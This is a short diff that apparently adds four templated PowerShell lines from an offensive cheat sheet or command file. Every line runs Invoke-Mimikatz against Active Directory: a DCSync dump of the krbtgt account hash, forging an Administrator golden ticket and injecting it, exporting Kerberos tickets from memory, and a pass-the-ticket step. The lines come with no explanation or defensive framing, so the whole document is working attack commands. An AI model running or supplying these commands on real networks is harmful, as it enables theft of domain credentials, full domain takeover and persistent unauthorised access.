@@ -1,0 +1,4 @@
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<<DomainFQDN>> /user:krbtgt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<<domain>> /sid:<<DomainSID>> /krbtgt:<<krbtgt>> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::tickets /export"'
+Invoke-Mimikatz -Command '"privilege::debug" "kerberos::ptt <<ticket>>.kirbi"'
